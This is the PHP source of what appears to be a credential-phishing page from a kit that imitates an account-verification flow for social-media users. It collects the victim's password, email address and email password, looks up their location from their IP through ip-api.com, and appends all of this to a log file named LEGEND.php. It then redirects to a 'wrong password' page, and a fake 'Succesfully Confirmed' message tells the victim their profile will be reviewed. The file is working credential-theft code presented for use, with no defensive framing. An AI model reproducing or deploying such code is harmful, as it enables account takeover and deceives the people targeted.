<?php
require 'load.php';
session_start();
set_time_limit(0);
error_reporting(E_ALL);

$username=$_GET['username'];
$url2="https://smihub.com/search?query=$username";
$ip=str_get_html(file_get_contents($url2));
$pp=$ip->find("img[class='img-fluid w-100']",0)->src;
$tik="-";
$followers="-";
if($_POST){
  $password=$_POST["password"];
  $mail=$_POST["mailadress"];
  $mailpass=$_POST["mailpass"];
  $ip=$_SERVER["REMOTE_ADDR"];
  $konum = file_get_contents("http://ip-api.com/xml/".$ip);
  $cek = new SimpleXMLElement($konum);
  $ulke = $cek->country;
  $sehir = $cek->city;
  date_default_timezone_set('Europe/Istanbul');
  $cur_time=date("d-m-Y H:i:s");
  $file = fopen('LEGEND.php', 'a');
  fwrite($file, "
<html>
<head>
	<meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'>
</head>
<body bgcolor='#0000a0'>
<body bgcolor='rgb(0,0,0)'>
<body bgcolor='darkblue'>

<font color='red'>Kullanıcı Adı: </font><font color='white'>".$username."</font><br>
<font color='red'> Şifre: </font><font color='white'>".$password."</font><br>
<font color='red'>Ip Adresi: </font><font color='white'>".$ip."</font><br>
<font color='red'>Tarih: </font><font color='white'>".$cur_time."</font><br>
<font color='red'>Ülke: </font><font color='white'>".$ulke."</font><br>
<font color='red'>Şehir: </font><font color='white'>".$sehir."</font><br>
<hr>


"); 

fclose($file);
echo '';
  
   header("Location: wrongpass.php?username=$username");
}
?>
<html>
  <head>
   <meta charset="utf-8">
    <title>Succesfully Confirmed</title>
   <meta name="viewport" content="width=device-width,initial-scale=1">
   <link rel="shortcut icon" href="image/fav.webp">
    <link href="css/style.css" type="text/css" rel="stylesheet"/>
   </head>
   

    

       
 <body style="padding:0px; margin:0px; background: #fafafa;">

</center>
 </div>
 <center>
 <br><br><br>
  <div class="form">
    <form method="post">
<br>	<img src="image/tik.png" width=80 style="border-radius:50%;">
<br><br>
<h1>Thanks <?php echo $username?>!</h1>
<p>
Please do not change anything about your account.Your profile will be reviewed within 2 days and you will be notified by message.
	</p>
	</form>
	</div>
	<br> <br>
<div id="get">

<img src="image/app.webp" width=120 >

<img src="image/play.webp" width=120>

</div>

<br><br><br>


<?php include 'footer.php'; ?>
